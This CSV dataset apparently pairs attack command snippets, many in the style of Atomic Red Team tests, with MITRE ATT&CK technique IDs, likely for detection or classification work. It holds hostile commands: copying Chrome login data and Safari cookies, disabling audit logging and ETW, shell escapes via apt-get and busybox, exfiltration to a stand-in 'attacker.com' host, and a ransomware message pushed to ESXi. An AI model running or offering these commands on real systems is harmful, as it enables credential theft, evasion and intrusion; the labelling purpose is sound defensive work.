command,mitre_id
"auditpol /set /category:""Logon/Logoff"" /success:disable /failure:disable",T1562
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ProxyEnable /t REG_DWORD /d 1 /f",T1112
ntpdate -a x -k /path/to/input-file -d localhost,T1005
"""c:\Program Files\Wireshark\tshark.exe"" -i $interface -c 5",T1040
readdir,T1574
"echo ""ExecStart=$execstart_action"" >> $systemd_service_path/$systemd_service_file",T1543
echo $ENCODED > $encoded_file && cat < $encoded_file | xxd -r -p,T1140
zlib,T1132
{12d61a41-4b74-7610-a4d8-3028d2f56395},T1480
nodeName,T1543
"cp ~/Library/""Application Support/Google/Chrome/Default/Login Data For Account"" ""/tmp/T1555.003_Login Data For Account""",T1555
zip,T1560
net time \\$computer_name,T1124
az ad user get-member-groups,T1069
"Set-Location ""PathToAtomicsFolder""",T1071
HKLM\SOFTWARE\Plus,T1027
csc.exe -out:{PATH:.exe} {PATH:.cs},T1127
if (Test-Path $zipPath) {,T1562
"System.Console.WriteLine(""tweet, tweet"");",T1036
echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file,T1059
HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run,T1547
"exiftool ""-description<=/path/to/input-file --filename /path/to/output-file",T1222
make /tmp/hello,T1548
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr.exe,T1547
file -f /path/to/input-file,T1005
echo End of Golden Ticket attack,T1558
.vgz,T1505
VirtualFree,T1106
latexmk -dvi /path/to/temp-file,T1005
foreach ($port in $ports) {,T1016
"[K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero)",T1566
Start-Process $file1 /S;,T1219
"New-Item -Path ""HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView""",T1562
cmd.exe /c del,T1070
"import-module ""$file_path\timestomp.ps1""",T1070
Crash,T1218
rbc.close();,T1105
cmd.exe /c net user {Username},T1087
Invoke-PowerDump,T1003
"$sheet.Cells.Item(18,1) = ""=FWRITELN(A5, `""End If`"")""",T1204
"ren ""%temp%\upload"" audiodg.exe",T1036
"wscript.exe ""$vbscript_file""",T1105
EnumCalendarInfoExW,T1106
"SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR ""[path to self]"" /ST 10:00",T1053
schtasks /query /tn win32times,T1036
"echo """" | ""$plink_file"" -batch ""$vm_host"" -ssh -l $vm_user -pw ""$vm_pass"" ""esxcli system welcomemsg set -m 'RANSOMWARE-NOTIFICATION'""",T1491
exec:,T1059
DeviceSync,T1112
.text,T1055
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,",T1218
Windows\CurrentVersion\Uninstall,T1012
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh,T1059
"PPID-Spoof -ppid $ppid -spawnto ""$spawnto_process_path"" -dllpath ""$dll_path""",T1134
/mem,T1003
"""import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))"" | Out-File -Encoding ASCII ""$SitePackages\atomic_hook.pth""",T1546
sshfs -o ssh_command=/path/to/command x: /path/to/dir/,T1059
pdftotext texput.pdf -,T1005
userParameters,T1556
"make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .",T1005
igfxem.exe,T1574
ssh-keygen -D /path/to/lib.so,T1574
"net group ""Domain Controllers"" /domain",T1018
"cp ~/Library/""Application Support/Google/Chrome/Default/Login Data"" ""/tmp/T1555.003_Login Data""",T1555
IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ),T1546
"copy ""$exe_path"" %temp%\T1036.007_masquerading.pdf.exe /Y",T1036
OpenProcessToken,T1134
"grep ""# THIS IS A COMMENT"" /etc/default/ufw",T1562
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad,T1012
reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f,T1053
tar cf /path/to/temp-file.tar /path/to/temp-file,T1222
VSDiagnostics.exe start 1 /launch:{PATH:.exe},T1127
"New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER_PATH"" -PropertyType String -Value ""$file_name"" -Force | Out-Null",T1574
"echo ""Hi friends"" >> $env:Userprofile\Desktop\akira_readme.txt",T1486
ls -a >> $output_file,T1083
New-AzAutomationRunbook -Name $runbook_name -Type PowerShell -ResourceGroupName $resource_group -Description 'my-test-runbook' -AutomationAccountName $automation_account_name,T1078
cancel -h attacker.com:12345 -u DATA,T1105
"osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""$destination_path""' -e 'set safariFolder to ((path to library folder from user domain as text) & ""Containers:com.apple.Safari:Data:Library:Cookies:"")' -e 'duplicate file ""Cookies.binarycookies"" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'",T1539
"rundll32.exe zipfldr.dll,RouteTheCall ""$exe_to_launch""",T1218
"python3 -c ""from base64 import b64decode;dec=b64decode(\""$ENCODED\"");print(dec.decode())""",T1140
PutLifecycleConfiguration,T1485
"rundll32.exe $dll_file,krnl",T1218
"If ($domain_sid -Match ""DEFAULT"") {",T1558
New-MailboxExportRequest,T1114
ftp -a attacker.com,T1105
/etc/hosts,T1018
"net group ""Domain Computers"" /domain",T1018
copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll,T1574
GetKeyboardType,T1614
"powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp $registry_key_storage $registry_entry_storage).$registry_entry_storage)))""",T1027
swapoff -a,T1562
"Write-Output ""Function code upload failed.""",T1528
GetBucketAcl,T1069
Resolve-DnsName -Name $dnsQuery,T1041
LSEnvironment,T1547
Set-AzureADUserPassword -ObjectId $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue,T1098
busybox sh &,T1059
FindNextUrlCacheEntryA,T1106
Security Settings\Local Policies\Audit Policy,T1562
"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;",T1098
/etc/rc.local.d/local.sh,T1564
"$base64Strings | Set-Content ""$HOME\decoded.ps1""",T1001
dir /s /b %USERPROFILE%\Favorites,T1217
ListAttachedRolePolicies,T1069
New-Item -Path $registryPath -Force,T1546
dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext},T1105
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security"" /v Level /t REG_DWORD /d 1 /f",T1137
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f",T1562
a9850d2f,T1074
known_host,T1041
DLLRegisterServer,T1218
%PROGRAMFILES%,T1547
NtImpersonateThread,T1134
ldapsearch,T1087
WSearch,T1543
cat /etc/*release | uniq,T1082
"echo ""$password"" | pw usermod $username -h 0",T1136
